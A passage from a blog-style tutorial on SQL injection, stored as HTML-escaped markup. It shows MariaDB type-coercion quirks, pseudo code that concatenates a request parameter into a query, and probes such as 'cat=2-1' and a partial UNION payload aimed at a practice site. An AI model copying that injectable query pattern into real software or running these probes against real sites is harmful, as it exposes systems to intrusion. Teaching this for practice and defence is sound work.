+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From now on, we know that we can do &lt;strong&gt;mathematical operations&lt;/strong&gt; with integers in sql, this is huge.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;2-1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It is same as before except for the single quotes.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This time what we see is returning of a string value. It is reasonable because single or double quotes
+are used for strings.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;2&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It is hard to predict what is going to happen this time right ? Let us see.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;2&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;       &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Database actually performed the same mathematical operation as before when we did &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT 2-1&lt;/code&gt;. That is because just like you,
+database’s mind get confused too, so it came up with an idea that ‘Oh wait, I can cast them into integers !’.Now we are one more
+step closer to understand the primitive behaviour of how databases work actually.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;2&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;2&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;       &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hmm, brains burning right ? It is simple really, just like before database converted string value to integer, however it could not convert
+&lt;strong&gt;a&lt;/strong&gt; to any integer, so it considered it as &lt;strong&gt;0&lt;/strong&gt;.By having this knowledge you should guess the output of this query.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;b&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;You predicted it ?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;b&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;       &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This time two non-convertible to integer values given into single quoutes, database performed &lt;strong&gt;0+0&lt;/strong&gt; this time.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;2&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This time instead putting an operation sign between those strings, we will left it blank.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As you can see, strings had been concatanated. So &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT &apos;2&apos; &apos;1&apos;&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;concat(&apos;2&apos;,&apos;1&apos;)&lt;/code&gt; do the same thing.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;2&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;You should be able to guess this one.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Yes you are right, still string concat.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;2&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From now on we know that, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;a&apos;-1&lt;/code&gt; will result -1. So this time instead of string concat, it will substract
+-1 from 21.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;2&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;            &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;
+There are few operants that you need to know.&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;^&lt;/code&gt;=XOR operator
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!&lt;/code&gt;=NOT operator&lt;/p&gt;
+
+&lt;h3 id=&quot;discipline&quot;&gt;Discipline&lt;/h3&gt;
+&lt;p&gt;We have discovered some primitive behaviours of the database. Now we need to understand
+which discipline we need to adopt to find a sql injection.&lt;/p&gt;
+
+&lt;p&gt;Lets say there is a back end code running at the server just like that.&lt;/p&gt;
+
+&lt;p&gt;PSEUDO CODE&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM news WHERE id =&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No news&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This is the pseudo code to illustrate possible setup working on a web server to bring html document.
+However we do not have access to this backend code, so what we are trying to do is that, we need to observe
+the behavior of the responds to see if there is an injection possiblity.&lt;/p&gt;
+
+&lt;p&gt;Now lets say there are two html pages, one for id ‘1’, and one for id ‘2’:&lt;/p&gt;
+
+&lt;p&gt;ID1&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;This is html document for ID 1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;ID2&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;This is html document for ID 2&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;While we dont have access to backend code, we can modify url.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;www.xyz.com/?id=&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As you can tell, we can bring one of those two html documents by passing related ID number to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=&lt;/code&gt; parameter.&lt;br /&gt;
+Right now all the behaviour we have learned should make sense. We can either make request for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=1&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;=id=2-1&lt;/code&gt;, both
+will bring the first html document which has ID1.&lt;/p&gt;
+&lt;h4 id=&quot;principles&quot;&gt;Principles&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;We need to determine an initial, referance point for our examination.
+In this case, it is html document of ID1 which we trying to return.&lt;/li&gt;
+  &lt;li&gt;Try to access to the initial point with different methods.
+In this case we forced database to make that 2-1 operation to get out initial point.
+&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;From now on, we broke the system, we have observed that, it is possible for us to manipulate the database with an unexcpected
+behavior. Key point is that, you could return your referance point with avoiding expected behavior.&lt;br /&gt;&lt;br /&gt;
+The question is that, what now ? How we can turn this vulnerability to our favour ? &lt;br /&gt;
+In order to exploit this sql injection, we need to be able to run our own select query, however as you can tell it is not
+possible to change the query while it is hardcoded at the backend, we only can modify the parameter of it. This is where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UNION&lt;/code&gt; saves the day.
+&lt;br /&gt;
+Instead of passing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2-1&lt;/code&gt; into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=&lt;/code&gt; field, we can pass &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 UNION SELECT (rest of the query)&lt;/code&gt;&lt;br /&gt;
+As you remember that is the code at the back end.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM news WHERE id =&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.xyz.com/?id=&apos;1 UNION SELECT .....&apos;&lt;/code&gt; &lt;br /&gt;
+&lt;br /&gt;Query will run this for http request above-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT * FROM news WHERE id=1 UNION SELECT (rest of the query)&lt;/code&gt;
+&lt;br /&gt; However at this point of time, we have two problems.&lt;br /&gt;
+1-What I will select in my own query ? What will replace the ,I do not know anything about the database.&lt;br /&gt;
+2-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UNION&lt;/code&gt; has its limitations, the number of columns that return for each query should match.&lt;br /&gt;
+It is time to do some real sql injection on a web page.&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnweb---union-sqli&quot;&gt;VULNWEB - UNION SQLi&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;http://test.php.vulnweb.com&quot;&gt;http://test.php.vulnweb.com&lt;/a&gt; is a vulnerable website for pentesting practice. Navigate to the web page.&lt;/p&gt;
+&lt;h3 id=&quot;remembering-the-principles&quot;&gt;Remembering the principles&lt;/h3&gt;
+&lt;p&gt;As we talked it about before, we have a principle that has two parts.
+&lt;br /&gt;
+1-Determine your referance point
+&lt;br /&gt;
+2-Find a way to get back to that referance point with unexpected behavior.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;making-sure-of-sql-injections-existence&quot;&gt;Making sure of SQL injection’s existence&lt;/h3&gt;
+&lt;p&gt;Navigate to &lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=1&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=1&lt;/a&gt; &lt;br /&gt;This will be our referance point.&lt;br /&gt;&lt;br /&gt;
+Than to &lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=2&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=2&lt;/a&gt; &lt;br /&gt;As we see different cat id brings different items from table.&lt;br /&gt;&lt;br /&gt;
+Than go for &lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=2-1&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=2-1&lt;/a&gt; &lt;br /&gt;&lt;br /&gt;We tried an unexpected behavior, and eventually returned to our referance point.
+&lt;br /&gt;Thus, now it is certain that this web site vulnerable to sql injection.
+&lt;br /&gt;And this is because there is no &lt;strong&gt;input validation&lt;/strong&gt; in the source code that is running on server side
+and anybody can pass whatever value they want in the input field, in this case in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=&lt;/code&gt; field.
+&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;guessing-the-design&quot;&gt;Guessing the design&lt;/h3&gt;
+&lt;p&gt;If you observe the url, you can guess there is a table named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;listproducts&lt;/code&gt; and a column named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;.&lt;br /&gt;
+Backend code may work like that:&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;some&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;unknown&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;column&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;listproducts&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Of course those names are not the same like that
+at the source code, so we still do not know any names from the database.
+And of course it may not work like that, just like I said, it is guessing.
+&lt;br /&gt;
